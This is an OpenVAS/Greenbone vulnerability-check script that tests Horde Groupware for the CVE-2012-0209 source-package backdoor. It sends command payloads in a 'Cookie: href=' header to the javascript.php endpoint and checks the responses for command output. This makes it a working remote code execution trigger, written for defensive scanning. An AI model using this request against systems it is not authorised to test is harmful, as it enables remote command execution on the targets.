# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:horde:horde_groupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103423");
  script_version("2025-03-27T05:38:50+0000");
  script_tag(name:"last_modification", value:"2025-03-27 05:38:50 +0000 (Thu, 27 Mar 2025)");
  script_tag(name:"creation_date", value:"2012-02-16 09:13:01 +0100 (Thu, 16 Feb 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2012-0209");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Horde Groupware Source Packages Backdoor Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("horde_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("horde/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Horde Groupware is prone to a backdoor vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code in
  the context of the application. Successful attacks will compromise the affected application.");

  script_tag(name:"affected", value:"Horde Groupware versions 1.2.10 between November 2, 2011, and
  February 7, 2012.");

  script_tag(name:"solution", value:"The vendor released an update. Please see the references for
  details.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51989");
  script_xref(name:"URL", value:"http://lists.horde.org/archives/announce/2012/000751.html");
  script_xref(name:"URL", value:"http://lists.horde.org/archives/announce/2012/000749.html");
  script_xref(name:"URL", value:"http://lists.horde.org/archives/announce/2012/000750.html");
  script_xref(name:"URL", value:"http://git.horde.org/diff.php/groupware/docs/groupware/CHANGES?rt=horde&r1=1.38.2.16&r2=1.38.2.17&ty=h%27");
  script_xref(name:"URL", value:"http://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

host = http_host_name(port: port);

cmds = exploit_commands();

url = dir + "/services/javascript.php?app=horde&file=open_calendar.js";

foreach pattern (keys(cmds)) {
  req = string("GET ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Cookie: href=", cmds[pattern], "\r\n\r\n");

  res = http_send_recv(port: port, data: req);

  if (egrep(pattern: pattern, string: res)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
